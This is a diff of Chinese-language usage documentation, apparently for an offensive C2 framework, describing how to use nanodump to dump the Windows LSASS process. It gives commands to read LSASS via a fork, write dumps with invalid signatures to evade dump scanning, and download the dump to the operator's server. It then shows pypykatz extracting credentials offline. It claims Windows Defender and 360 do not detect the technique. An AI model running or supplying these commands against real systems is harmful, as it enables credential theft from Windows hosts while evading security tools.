@@ -92,12 +92,23 @@ nanodump是一个一种灵活的工具，可创建 LSASS 进程的小型转储
 
 经测试，核晶和windows defender都无感。
 
-1. 通过fork间接读取 LSASS ,并使用无效签名将转储写入到目标机器磁盘
+1. 通过fork间接读取 LSASS。默认会写无效签名（规避目标上的 dump 扫描）。
 ```
-nanodump -- --fork --write "C:\lsass.dmp"
-.\restore_signature.exe lsass.dmp
+nanodump --fork
+```
+dump 经 BOF 文件回调落到 server 的 `context/download` 时，会自动把文件头恢复为 `MDMP`（等价于 `restore_signature`）。`--valid`、`--shtinkering`、`--silent-process-exit` 本身就是合法签名，不会改写。
+
+凭据仍需离线解析：
+```
 python -m pypykatz lsa minidump lsass.dmp
 ```
+
+若要把 dump 写到目标磁盘：
+```
+nanodump --fork --write --write-path C:\lsass.dmp
+download C:\lsass.dmp
+```
+`download` 完成后同样会补签名。
 ![nanodump.png](../../assets/usage/lsass/nanodump2.png)
 
 2. 使用 seclogon Leak Remote 在记事本进程中泄漏 LSASS 句柄，复制该句柄以访问 LSASS，然后通过创建分叉并使用有效签名(--valid)，下载转储来间接读取它
